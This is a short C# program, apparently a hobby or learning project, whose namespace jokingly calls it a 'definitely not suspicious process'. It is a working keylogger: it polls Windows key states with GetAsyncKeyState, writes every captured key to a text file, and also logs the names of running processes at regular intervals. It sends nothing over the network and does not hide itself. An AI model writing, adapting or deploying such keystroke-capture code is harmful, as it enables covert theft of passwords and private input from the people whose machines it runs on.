using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Совершенно_точно_не_подозрительный_процесс
{
    class Program
    {
        private static StringBuilder _keyLog = new StringBuilder();
        private static string _logFilePath;
        private static int _saveIntervalSeconds;

        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        static void Main(string[] args)
        {
            //_logFilePath = args[0];
            //_saveIntervalSeconds = int.Parse(args[1]);
            _logFilePath = Directory.GetCurrentDirectory();
            _saveIntervalSeconds = 10;

            Thread monitoringThread = new Thread(ProcessMonitoring);
            monitoringThread.IsBackground = true;
            monitoringThread.Start();

            Thread keyLoggerThread = new Thread(LogKeys);
            keyLoggerThread.IsBackground = true;
            keyLoggerThread.Start();
            while (true)
            {
                Thread.Sleep(1000);
            }
        }

        private static void LogKeys()
        {
            while (true)
            {
                for (int i = 0; i < 255; i++)
                {
                    int keyState = GetAsyncKeyState(i);
                    if (keyState == 1 || keyState == -32767)
                    {
                        _keyLog.Append((Keys)i + " ");
                    }
                }

                if (_keyLog.Length > 0)
                {
                    try
                    {
                        using (StreamWriter writer = new StreamWriter(_logFilePath + "LogKeys.txt", true))
                        {
                            writer.WriteLine($"[{DateTime.Now}] Keys: {_keyLog}");
                        }
                        _keyLog.Clear();
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"Error logging keys: {ex.Message}");
                    }
                }

                Thread.Sleep(10000);
            
            }
        }

        private static void ProcessMonitoring()
        {
            while (true)
            {
                try
                {
                    var processes = Process.GetProcesses();
                    string filePath = _logFilePath;
                    string fileName = $"[{DateTime.Now.ToString()}]";
                    fileName = fileName.Replace('.', '-');
                    fileName = fileName.Replace(':', '-');

                    using (StreamWriter writer = new StreamWriter(filePath + "\\" + fileName + " Log monitoring" + ".txt", true))
                    {
                        writer.WriteLine("Активные процессы:");
                        foreach (var process in processes)
                        {
                            writer.WriteLine($"- {process.ProcessName}");
                        }
                    }
                    Thread.Sleep(_saveIntervalSeconds * 1000);
                }
                catch (Exception ex)
                {
                    Console.WriteLine(_logFilePath, $"Ошибка: {ex.Message}\n");
                }
            }
        }
    }

    public class MonitoringSettings
    {
        public string LogFilePath { get; set; }
        public int SaveIntervalSeconds { get; set; }
    }
}
